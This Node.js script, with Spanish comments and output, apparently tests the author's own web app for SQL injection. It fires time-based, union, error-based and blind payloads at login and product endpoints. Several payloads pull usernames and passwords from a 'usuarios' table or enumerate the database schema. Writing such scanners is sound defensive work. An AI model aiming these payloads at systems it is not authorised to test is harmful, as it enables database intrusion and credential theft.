#!/usr/bin/env node
require('dotenv').config();
const axios = require('axios');

class AdvancedSQLInjectionTester {
    constructor() {
        this.baseUrl = process.env.BASE_URL || 'http://localhost:3000';
        this.results = {
            totalTests: 0,
            vulnerabilities: [],
            timeBasedTests: [],
            unionTests: [],
            errorBasedTests: []
        };
    }

    // Payloads específicos para diferentes tipos de SQL Injection
    getTimeBasedPayloads() {
        return [
            "' OR (SELECT COUNT(*) FROM usuarios WHERE SUBSTRING(password,1,1)='a' AND SLEEP(5))--",
            "' OR IF(1=1, SLEEP(5), 0)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ];
    }

    getUnionBasedPayloads() {
        return [
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT username,password,email,1,2 FROM usuarios--",
            "' UNION SELECT version(),user(),database(),1,2--",
            "' UNION SELECT table_name,column_name,1,2,3 FROM information_schema.columns--",
            "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--"
        ];
    }

    getErrorBasedPayloads() {
        return [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=1/0--",
            "' UNION SELECT 1,2,3,username,password FROM usuarios WHERE '1'='1"
        ];
    }

    getBlindSQLPayloads() {
        return [
            "' AND ASCII(SUBSTRING((SELECT password FROM usuarios LIMIT 1),1,1))>64--",
            "' AND LENGTH((SELECT username FROM usuarios LIMIT 1))>3--",
            "' AND (SELECT COUNT(*) FROM usuarios)>0--",
            "' AND EXISTS(SELECT * FROM usuarios WHERE username='admin')--",
            "' AND 1=(SELECT 1 FROM usuarios WHERE username='admin' AND LENGTH(password)>5)--"
        ];
    }

    // Test específico para Time-Based SQL Injection
    async testTimeBasedSQLInjection() {
        console.log('\n⏰ PRUEBAS TIME-BASED SQL INJECTION');
        console.log('====================================');

        const payloads = this.getTimeBasedPayloads();
        const endpoints = [
            { method: 'POST', path: '/auth/login', params: { usuario: 'PAYLOAD', password: 'test' } },
            { method: 'GET', path: '/api/productos', query: 'search=PAYLOAD' }
        ];

        for (const endpoint of endpoints) {
            console.log(`🎯 Probando ${endpoint.method} ${endpoint.path}`);
            
            for (const payload of payloads) {
                const startTime = Date.now();
                await this.testSQLPayload(endpoint, payload);
                const responseTime = Date.now() - startTime;
                
                // Si la respuesta toma más de 4 segundos, podría ser vulnerable
                if (responseTime > 4000) {
                    console.log(`❌ POSIBLE TIME-BASED INJECTION: ${responseTime}ms`);
                    this.results.vulnerabilities.push({
                        type: 'Time-Based SQL Injection',
                        endpoint: `${endpoint.method} ${endpoint.path}`,
                        payload: payload,
                        responseTime: responseTime
                    });
                } else {
                    console.log(`✅ Tiempo normal: ${responseTime}ms`);
                }
                
                this.results.timeBasedTests.push({
                    endpoint: `${endpoint.method} ${endpoint.path}`,
                    payload: payload,
                    responseTime: responseTime
                });
            }
        }
    }

    // Test específico para Union-Based SQL Injection
    async testUnionBasedSQLInjection() {
        console.log('\n🔗 PRUEBAS UNION-BASED SQL INJECTION');
        console.log('=====================================');

        const payloads = this.getUnionBasedPayloads();
        const endpoints = [
            { method: 'GET', path: '/api/productos', query: 'id=1 PAYLOAD' },
            { method: 'GET', path: '/api/categorias', query: 'codigo=CAT1 PAYLOAD' }
        ];

        for (const endpoint of endpoints) {
            for (const payload of payloads) {
                await this.testUnionPayload(endpoint, payload);
            }
        }
    }

    async testUnionPayload(endpoint, payload) {
        this.results.totalTests++;
        
        try {
            const url = `${this.baseUrl}${endpoint.path}?${endpoint.query.replace('PAYLOAD', encodeURIComponent(payload))}`;
            const response = await axios.get(url, { 
                timeout: 10000, 
                validateStatus: () => true 
            });

            const responseText = JSON.stringify(response.data);
            
            // Buscar indicadores de UNION exitoso
            const unionIndicators = [
                'admin', 'password', 'username', 'email',
                'version()', 'user()', 'database()',
                'information_schema', 'table_name', 'column_name'
            ];

            let foundIndicators = 0;
            for (const indicator of unionIndicators) {
                if (responseText.toLowerCase().includes(indicator.toLowerCase())) {
                    foundIndicators++;
                }
            }

            if (foundIndicators > 1) {
                console.log(`❌ POSIBLE UNION INJECTION: ${foundIndicators} indicadores encontrados`);
                this.results.vulnerabilities.push({
                    type: 'Union-Based SQL Injection',
                    endpoint: `${endpoint.method} ${endpoint.path}`,
                    payload: payload,
                    indicators: foundIndicators
                });
            } else {
                console.log(`✅ Sin indicadores de UNION injection`);
            }

            this.results.unionTests.push({
                endpoint: `${endpoint.method} ${endpoint.path}`,
                payload: payload,
                indicators: foundIndicators,
                responseLength: responseText.length
            });

        } catch (error) {
            console.log(`⚠️  Error en UNION test: ${error.message}`);
        }
    }

    // Test para Blind SQL Injection
    async testBlindSQLInjection() {
        console.log('\n👁️  PRUEBAS BLIND SQL INJECTION');
        console.log('===============================');

        const payloads = this.getBlindSQLPayloads();
        const endpoint = { method: 'GET', path: '/api/productos', query: 'search=test PAYLOAD' };

        // Primero, obtener respuesta base
        const baseResponse = await this.getBaseResponse(endpoint);
        
        for (const payload of payloads) {
            await this.testBlindPayload(endpoint, payload, baseResponse);
        }
    }

    async getBaseResponse(endpoint) {
        try {
            const url = `${this.baseUrl}${endpoint.path}?${endpoint.query.replace(' PAYLOAD', '')}`;
            const response = await axios.get(url, { timeout: 5000, validateStatus: () => true });
            return {
                status: response.status,
                length: JSON.stringify(response.data).length,
                data: response.data
            };
        } catch (error) {
            return null;
        }
    }

    async testBlindPayload(endpoint, payload, baseResponse) {
        try {
            const url = `${this.baseUrl}${endpoint.path}?${endpoint.query.replace('PAYLOAD', encodeURIComponent(payload))}`;
            const response = await axios.get(url, { timeout: 5000, validateStatus: () => true });
            
            const currentResponse = {
                status: response.status,
                length: JSON.stringify(response.data).length,
                data: response.data
            };

            // Comparar respuestas para detectar diferencias
            let differences = 0;
            if (baseResponse) {
                if (currentResponse.status !== baseResponse.status) differences++;
                if (Math.abs(currentResponse.length - baseResponse.length) > 50) differences++;
            }

            if (differences > 0) {
                console.log(`❌ POSIBLE BLIND INJECTION: ${differences} diferencias detectadas`);
                this.results.vulnerabilities.push({
                    type: 'Blind SQL Injection',
                    endpoint: `${endpoint.method} ${endpoint.path}`,
                    payload: payload,
                    differences: differences
                });
            } else {
                console.log(`✅ Sin indicadores de Blind injection`);
            }

        } catch (error) {
            console.log(`⚠️  Error en Blind test: ${error.message}`);
        }
    }

    async testSQLPayload(endpoint, payload) {
        try {
            let config = {
                method: endpoint.method,
                url: `${this.baseUrl}${endpoint.path}`,
                timeout: 10000,
                validateStatus: () => true
            };

            if (endpoint.method === 'POST' && endpoint.params) {
                const params = { ...endpoint.params };
                Object.keys(params).forEach(key => {
                    if (params[key] === 'PAYLOAD') {
                        params[key] = payload;
                    }
                });
                config.data = params;
                config.headers = { 'Content-Type': 'application/json' };
            } else if (endpoint.query) {
                config.url += '?' + endpoint.query.replace('PAYLOAD', encodeURIComponent(payload));
            }

            const response = await axios(config);
            this.results.totalTests++;
            
            return response;
        } catch (error) {
            return null;
        }
    }

    generateAdvancedReport() {
        console.log('\n📊 REPORTE AVANZADO DE SQL INJECTION');
        console.log('=====================================');
        console.log(`🔢 Total de pruebas: ${this.results.totalTests}`);
        console.log(`🚨 Vulnerabilidades encontradas: ${this.results.vulnerabilities.length}`);

        if (this.results.vulnerabilities.length > 0) {
            console.log('\n🔴 VULNERABILIDADES CRÍTICAS');
            console.log('=============================');
            
            this.results.vulnerabilities.forEach((vuln, index) => {
                console.log(`\n${index + 1}. ${vuln.type}`);
                console.log(`   Endpoint: ${vuln.endpoint}`);
                console.log(`   Payload: ${vuln.payload.substring(0, 50)}...`);
                if (vuln.responseTime) console.log(`   Tiempo de respuesta: ${vuln.responseTime}ms`);
                if (vuln.indicators) console.log(`   Indicadores: ${vuln.indicators}`);
            });
        }

        // Análisis de Time-Based tests
        if (this.results.timeBasedTests.length > 0) {
            const avgTime = this.results.timeBasedTests.reduce((sum, test) => sum + test.responseTime, 0) / this.results.timeBasedTests.length;
            console.log(`\n⏰ Tiempo promedio de respuesta: ${avgTime.toFixed(0)}ms`);
            
            const slowResponses = this.results.timeBasedTests.filter(test => test.responseTime > 2000);
            if (slowResponses.length > 0) {
                console.log(`⚠️  Respuestas lentas detectadas: ${slowResponses.length}`);
            }
        }
    }

    async runAdvancedTests() {
        console.log('🔬 PRUEBAS AVANZADAS DE SQL INJECTION');
        console.log('======================================');
        console.log(`📡 Servidor objetivo: ${this.baseUrl}`);

        await this.testTimeBasedSQLInjection();
        await this.testUnionBasedSQLInjection();
        await this.testBlindSQLInjection();
        
        this.generateAdvancedReport();
    }
}

// Ejecutar pruebas avanzadas
const advancedTester = new AdvancedSQLInjectionTester();
advancedTester.runAdvancedTests().catch(console.error);